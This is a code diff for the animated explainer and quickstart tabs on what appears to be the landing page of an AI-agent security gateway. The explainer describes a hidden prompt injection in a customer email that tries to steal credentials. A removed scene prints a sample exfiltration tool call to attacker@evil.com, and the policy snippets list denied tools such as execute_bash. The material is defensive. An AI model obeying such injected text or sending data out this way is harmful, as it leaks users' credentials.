@@ -105,17 +105,24 @@
       container.removeChild(container.firstChild);
     }
 
-    // 1. If local MP4 exists
+    // 1. If local MP4/WebM exists
     if (videoConfig && videoConfig.has_local_video) {
       var video = document.createElement("video");
       video.setAttribute("controls", "controls");
       video.setAttribute("autoplay", "autoplay");
       video.setAttribute("muted", "muted");
       video.setAttribute("playsinline", "playsinline");
-      video.setAttribute("src", "/static/assets/demo.mp4");
       if (videoConfig.poster_url) {
         video.setAttribute("poster", videoConfig.poster_url);
       }
+      var srcWebm = document.createElement("source");
+      srcWebm.setAttribute("src", "/static/assets/demo.webm");
+      srcWebm.setAttribute("type", "video/webm");
+      var srcMp4 = document.createElement("source");
+      srcMp4.setAttribute("src", "/static/assets/demo.mp4");
+      srcMp4.setAttribute("type", "video/mp4");
+      video.appendChild(srcWebm);
+      video.appendChild(srcMp4);
       container.appendChild(video);
       return;
     }
@@ -137,59 +144,122 @@
   // -------------------------------------------------------------
   // 4. Self-Contained 6-Scene Animated Explainer (HTML/CSS/JS)
   // -------------------------------------------------------------
+  function clearEl(el) {
+    while (el.firstChild) {
+      el.removeChild(el.firstChild);
+    }
+  }
+
   var scenes = [
     {
       num: 1,
-      caption: "1. An AI agent reads an external document.",
-      detail: "MailBot ingests customer feedback from a public forum.",
+      caption: "1. Developers connect their agent via reverse proxy (1-line config).",
+      detail: "Point any OpenAI, LangChain, or HTTP client to Tether Gateway at /v1.",
       render: function (ctx) {
-        ctx.innerHTML = "";
-        var docCard = createEl("div", "explainer-doc");
-        docCard.style.background = "#F7F4EE";
-        docCard.style.color = "#17150F";
-        docCard.style.border = "1.5px solid #17150F";
-        docCard.style.boxShadow = "4px 4px 0px #000";
-        docCard.style.padding = "16px";
-        docCard.style.width = "340px";
-        docCard.style.fontFamily = "monospace";
-        docCard.style.fontSize = "12px";
+        clearEl(ctx);
+        var ideCard = createEl("div", "explainer-doc");
+        ideCard.style.background = "#17150F";
+        ideCard.style.color = "#E2E8F0";
+        ideCard.style.border = "1.5px solid #FF5A1F";
+        ideCard.style.boxShadow = "4px 4px 0px #000";
+        ideCard.style.padding = "14px 18px";
+        ideCard.style.maxWidth = "440px";
+        ideCard.style.width = "100%";
+        ideCard.style.fontFamily = "monospace";
+        ideCard.style.fontSize = "12px";
 
-        var title = createEl("div", "");
-        title.style.fontWeight = "bold";
-        title.style.marginBottom = "8px";
-        title.textContent = "DOCUMENT: feedback_982.txt";
+        var bar = createEl("div", "");
+        bar.style.display = "flex";
+        bar.style.justifyContent = "space-between";
+        bar.style.borderBottom = "1px solid #334155";
+        bar.style.paddingBottom = "6px";
+        bar.style.marginBottom = "8px";
+        bar.style.color = "#FF5A1F";
+        bar.style.fontWeight = "bold";
+        bar.textContent = "agent_client.py (OPENAI SDK DROP-IN)";
 
-        var body = createEl("div", "");
-        body.textContent = "Customer review: Delivery speed was outstanding. Highly recommended vendor.";
+        var code = createEl("pre", "");
+        code.style.lineHeight = "1.5";
+        code.style.color = "#38BDF8";
+        code.textContent =
+          "from openai import OpenAI\n\n" +
+          "# Point client to Tether Gateway:\n" +
+          "client = OpenAI(\n" +
+          "    base_url='https://tether-gateway/v1',\n" +
+          "    api_key='sk_client_demo_judge_access'\n" +
+          ")\n" +
+          "# Agent calls execute with zero harness rewrite";
 
-        docCard.appendChild(title);
-        docCard.appendChild(body);
-        ctx.appendChild(docCard);
+        ideCard.appendChild(bar);
+        ideCard.appendChild(code);
+        ctx.appendChild(ideCard);
       }
     },
     {
       num: 2,
-      caption: "2. The document hides an instruction.",
-      detail: "Hidden prompt injection instructs the model to exfiltrate internal data.",
+      caption: "2. Security engineers define declarative policies in YAML.",
+      detail: "Specifies allowed tools, approval gates, and forbidden capabilities.",
       render: function (ctx) {
-        ctx.innerHTML = "";
+        clearEl(ctx);
+        var polCard = createEl("div", "explainer-doc");
+        polCard.style.background = "#F7F4EE";
+        polCard.style.color = "#17150F";
+        polCard.style.border = "1.5px solid #17150F";
+        polCard.style.boxShadow = "4px 4px 0px #000";
+        polCard.style.padding = "14px 18px";
+        polCard.style.maxWidth = "440px";
+        polCard.style.width = "100%";
+        polCard.style.fontFamily = "monospace";
+        polCard.style.fontSize = "12px";
+
+        var bar = createEl("div", "");
+        bar.style.display = "flex";
+        bar.style.justifyContent = "space-between";
+        bar.style.borderBottom = "1px solid #CBD5E1";
+        bar.style.paddingBottom = "6px";
+        bar.style.marginBottom = "8px";
+        bar.style.fontWeight = "bold";
+        bar.textContent = "policies/coder_agent.yaml";
+
+        var code = createEl("pre", "");
+        code.style.lineHeight = "1.5";
+        code.style.color = "#1E293B";
+        code.textContent =
+          "agent_id: coder_agent\n" +
+          "allowed_tools: [git_diff, run_linter]\n" +
+          "require_approval_tools: [write_file, send_email]\n" +
+          "denied_tools: [execute_bash, drop_db]\n" +
+          "taint_escalation: true";
+
+        polCard.appendChild(bar);
+        polCard.appendChild(code);
+        ctx.appendChild(polCard);
+      }
+    },
+    {
+      num: 3,
+      caption: "3. Agent ingests an untrusted document with hidden injection.",
+      detail: "External customer email attempts to hijack agent tools to steal credentials.",
+      render: function (ctx) {
+        clearEl(ctx);
         var docCard = createEl("div", "explainer-doc");
         docCard.style.background = "#F7F4EE";
         docCard.style.color = "#17150F";
         docCard.style.border = "1.5px solid #17150F";
         docCard.style.boxShadow = "4px 4px 0px #000";
-        docCard.style.padding = "16px";
-        docCard.style.width = "380px";
+        docCard.style.padding = "14px 18px";
+        docCard.style.maxWidth = "460px";
+        docCard.style.width = "100%";
         docCard.style.fontFamily = "monospace";
         docCard.style.fontSize = "12px";
 
         var title = createEl("div", "");
         title.style.fontWeight = "bold";
         title.style.marginBottom = "6px";
-        title.textContent = "POISONED PAYLOAD DETECTED";
+        title.textContent = "INCOMING UNTRUSTED WEBHOOK / DOCUMENT";
 
         var normal = createEl("div", "");
-        normal.textContent = "Quality was acceptable. ";
+        normal.textContent = "Customer ticket #982: Please review my invoice. ";
 
         var hidden = createEl("span", "");
         hidden.style.background = "#FFDAD6";
@@ -206,49 +276,19 @@
       }
     },
     {
-      num: 3,
-      caption: "3. Without protection, the agent obeys.",
-      detail: "The raw LLM naively executes the injected command with no guardrails.",
-      render: function (ctx) {
-        ctx.innerHTML = "";
-        var alertCard = createEl("div", "explainer-alert");
-        alertCard.style.background = "#BA1A1A";
-        alertCard.style.color = "#FFFFFF";
-        alertCard.style.border = "2px solid #000";
-        alertCard.style.boxShadow = "5px 5px 0px #000";
-        alertCard.style.padding = "20px";
-        alertCard.style.maxWidth = "420px";
-        alertCard.style.textAlign = "center";
-        alertCard.style.fontFamily = "monospace";
-
-        var h = createEl("div", "");
-        h.style.fontSize = "18px";
-        h.style.fontWeight = "bold";
-        h.textContent = "RAW HIJACKED EXECUTION (SHIELD OFF)";
-
-        var desc = createEl("div", "");
-        desc.style.marginTop = "8px";
-        desc.style.fontSize = "13px";
-        desc.textContent = "Tool call dispatched: send_email(to='attacker@evil.com', body='Exfiltrated credentials...')";
-
-        alertCard.appendChild(h);
-        alertCard.appendChild(desc);
-        ctx.appendChild(alertCard);
-      }
-    },
-    {
       num: 4,
-      caption: "4. With Tether, content is labeled untrusted and scanned.",
-      detail: "Multi-stage de-obfuscation normalizes text and wraps it in cryptographic boundaries.",
+      caption: "4. Tether intercepts inbound call, marks boundaries & taints session.",
+      detail: "Multi-stage de-obfuscation detects R_OVR_01 pattern and marks context.",
       render: function (ctx) {
-        ctx.innerHTML = "";
+        clearEl(ctx);
         var shieldCard = createEl("div", "explainer-shield");
         shieldCard.style.background = "#E0E5CC";
         shieldCard.style.color = "#17150F";
         shieldCard.style.border = "2px solid #17150F";
         shieldCard.style.boxShadow = "5px 5px 0px #17150F";
-        shieldCard.style.padding = "16px";
-        shieldCard.style.maxWidth = "440px";
+        shieldCard.style.padding = "14px 18px";
+        shieldCard.style.maxWidth = "460px";
+        shieldCard.style.width = "100%";
         shieldCard.style.fontFamily = "monospace";
 
         var h = createEl("div", "");
@@ -268,7 +308,7 @@
         status.style.marginTop = "8px";
         status.style.fontWeight = "bold";
         status.style.color = "#BA1A1A";
-        status.textContent = "Scanner: R_OVR_01 Match | Session permanently TAINTED";
+        status.textContent = "Heuristic Scanner: R_OVR_01 Match | Session permanently TAINTED";
 
         shieldCard.appendChild(h);
         shieldCard.appendChild(tag);
@@ -278,17 +318,18 @@
     },
     {
       num: 5,
-      caption: "5. Risky actions need permission or a human's approval.",
-      detail: "Tainted session blocks side-effect tools and generates a live pending approval.",
+      caption: "5. Policy traps tool call & mints single-use capability token.",
+      detail: "Unauthorized tool execution halted; human approval issues HMAC token.",
       render: function (ctx) {
-        ctx.innerHTML = "";
+        clearEl(ctx);
         var modal = createEl("div", "explainer-approval");
         modal.style.background = "#FFF8EF";
         modal.style.color = "#17150F";
         modal.style.border = "2px solid #17150F";
         modal.style.boxShadow = "6px 6px 0px #17150F";
-        modal.style.padding = "16px";
-        modal.style.maxWidth = "420px";
+        modal.style.padding = "14px 18px";
+        modal.style.maxWidth = "460px";
+        modal.style.width = "100%";
         modal.style.fontFamily = "monospace";
 
         var h = createEl("div", "");
@@ -299,16 +340,24 @@
         var detail = createEl("div", "");
         detail.style.fontSize = "12px";
         detail.style.marginTop = "6px";
-        detail.textContent = "Target: send_email | Reason: TAINTED_SESSION_ESCALATED";
+        detail.textContent = "Target Tool: send_email | Reason: TAINTED_SESSION_ESCALATED";
+
+        var tokenBox = createEl("div", "");
+        tokenBox.style.marginTop = "8px";
+        tokenBox.style.padding = "4px 8px";
+        tokenBox.style.background = "#17150F";
+        tokenBox.style.color = "#10B981";
+        tokenBox.style.fontSize = "11px";
+        tokenBox.textContent = "CAPABILITY_TOKEN: cap_hmac_8a92f0... (SINGLE-USE ONLY)";
 
         var btnBar = createEl("div", "");
         btnBar.style.display = "flex";
         btnBar.style.gap = "8px";
-        btnBar.style.marginTop = "12px";
+        btnBar.style.marginTop = "10px";
 
         var btnApprove = createEl("button", "explainer-btn");
         btnApprove.style.background = "#5C614D";
-        btnApprove.textContent = "APPROVE (MINT CAPABILITY)";
+        btnApprove.textContent = "AUTHORIZE TOOL CALL";
 
         var btnReject = createEl("button", "explainer-btn");
         btnReject.style.background = "#BA1A1A";
@@ -318,16 +367,17 @@
         btnBar.appendChild(btnReject);
         modal.appendChild(h);
         modal.appendChild(detail);
+        modal.appendChild(tokenBox);
         modal.appendChild(btnBar);
         ctx.appendChild(modal);
       }
     },
     {
       num: 6,
-      caption: "6. Everything is logged in a tamper-evident chain.",
-      detail: "Cryptographic hash blocks record all events; unauthorized edits break the chain.",
+      caption: "6. Tamper-evident cryptographic audit chain proves integrity.",
+      detail: "Forward-linked SHA-256 hash blocks verify that logs were never modified.",
       render: function (ctx) {
-        ctx.innerHTML = "";
+        clearEl(ctx);
         var chainContainer = createEl("div", "");
         chainContainer.style.display = "flex";
         chainContainer.style.gap = "8px";
@@ -335,11 +385,17 @@
         chainContainer.style.flexWrap = "wrap";
         chainContainer.style.justifyContent = "center";
 
-        for (var i = 1; i <= 3; i++) {
+        var blockData = [
+          { num: "BLOCK #101", desc: "INBOUND SCAN (ALLOW)" },
+          { num: "BLOCK #102", desc: "TAINT DETECTED (ESCALATED)" },
+          { num: "BLOCK #103", desc: "CAPABILITY MINTED (APPROVED)" },
+        ];
+
+        for (var i = 0; i < blockData.length; i++) {
           var block = createEl("div", "explainer-block");
-          block.style.background = i === 2 ? "#FFDAD6" : "#F7F4EE";
+          block.style.background = i === 1 ? "#FFDAD6" : "#F7F4EE";
           block.style.color = "#17150F";
-          block.style.border = i === 2 ? "2px solid #BA1A1A" : "1.5px solid #17150F";
+          block.style.border = i === 1 ? "2px solid #BA1A1A" : "1.5px solid #17150F";
           block.style.padding = "8px 12px";
           block.style.fontFamily = "monospace";
           block.style.fontSize = "11px";
@@ -347,14 +403,20 @@
 
           var bNum = createEl("div", "");
           bNum.style.fontWeight = "bold";
-          bNum.textContent = "BLOCK #" + (100 + i);
+          bNum.textContent = blockData[i].num;
+
+          var bAction = createEl("div", "");
+          bAction.style.fontSize = "10px";
+          bAction.style.marginTop = "2px";
+          bAction.textContent = blockData[i].desc;
 
           var bHash = createEl("div", "");
           bHash.style.fontSize = "9px";
           bHash.style.color = "#615E56";
-          bHash.textContent = i === 2 ? "HASH TAMPERED!" : "SHA256 LINKED";
+          bHash.textContent = "SHA-256 LINKED";
 
           block.appendChild(bNum);
+          block.appendChild(bAction);
           block.appendChild(bHash);
           chainContainer.appendChild(block);
         }
@@ -492,10 +554,91 @@
   }
 
   // -------------------------------------------------------------
-  // 5. Lifecycle Initialization
+  // 5. Developer Quickstart Tab Switcher
+  // -------------------------------------------------------------
+  function setupQuickstartTabs() {
+    var tabs = document.querySelectorAll(".quickstart-tab");
+    var codeDisplay = document.getElementById("quickstart-code-display");
+    if (!tabs.length || !codeDisplay) return;
+
+    var snippets = {
+      "tab-python":
+        "# Step 1: Point your standard OpenAI client to the Tether Gateway\n" +
+        "from openai import OpenAI\n\n" +
+        "client = OpenAI(\n" +
+        "    base_url='https://agent-hijack-gateway.onrender.com/v1',  # Tether Gateway URL\n" +
+        "    api_key='sk_client_demo_judge_access',                  # Your client API key\n" +
+        ")\n\n" +
+        "# Step 2: All agent prompts and tool calls pass through Tether's defense pipeline\n" +
+        "response = client.chat.completions.create(\n" +
+        "    model='coder_agent',\n" +
+        "    messages=[\n" +
+        "        {'role': 'user', 'content': 'Analyze customer issue #104 and draft a patch.'},\n" +
+        "    ],\n" +
+        ")\n\n" +
+        "print(response.choices[0].message.content)",
+
+      "tab-langchain":
+        "# LangChain / CrewAI Integration with Tether Security Sidecar\n" +
+        "from langchain_openai import ChatOpenAI\n" +
+        "from langchain.agents import AgentExecutor, create_tool_calling_agent\n\n" +
+        "# Configure Tether-secured LLM wrapper\n" +
+        "llm = ChatOpenAI(\n" +
+        "    base_url='https://agent-hijack-gateway.onrender.com/v1',\n" +
+        "    api_key='sk_client_demo_judge_access',\n" +
+        "    model='coder_agent',\n" +
+        ")\n\n" +
+        "# Autonomous agents execute within declarative policy boundaries;\n" +
+        "# untrusted inputs cannot trigger unauthorized filesystem or network side-effects.",
+
+      "tab-yaml":
+        "# policies/coder_agent.yaml - Declarative Agent Security Policy\n" +
+        "agent_id: coder_agent\n" +
+        "version: 1\n" +
+        "description: Software engineering assistant with restricted filesystem\n" +
+        "allowed_tools:\n" +
+        "  - git_diff\n" +
+        "  - run_linter\n" +
+        "  - read_file\n" +
+        "require_approval_tools:\n" +
+        "  - write_file\n" +
+        "  - git_push\n" +
+        "  - http_request\n" +
+        "denied_tools:\n" +
+        "  - execute_bash\n" +
+        "  - delete_file\n" +
+        "taint_escalation: true",
+
+      "tab-curl":
+        "# Send request directly to Tether Gateway /v1/chat\n" +
+        "curl -X POST https://agent-hijack-gateway.onrender.com/v1/chat \\\n" +
+        "  -H 'Content-Type: application/json' \\\n" +
+        "  -H 'X-API-Key: sk_client_demo_judge_access' \\\n" +
+        "  -d '{\n" +
+        "    \"agent_id\": \"coder_agent\",\n" +
+        "    \"message\": \"Analyze PR #42 and summarize findings.\",\n" +
+        "    \"shield_enabled\": true\n" +
+        "  }'"
+    };
+
+    tabs.forEach(function (tab) {
+      tab.addEventListener("click", function () {
+        tabs.forEach(function (t) { t.classList.remove("active"); });
+        tab.classList.add("active");
+        var tabKey = tab.getAttribute("data-tab");
+        if (snippets[tabKey]) {
+          codeDisplay.textContent = snippets[tabKey];
+        }
+      });
+    });
+  }
+
+  // -------------------------------------------------------------
+  // 6. Lifecycle Initialization
   // -------------------------------------------------------------
   document.addEventListener("DOMContentLoaded", function () {
     startSystemClock();
     loadSummaryMetrics();
+    setupQuickstartTabs();
   });
 })();
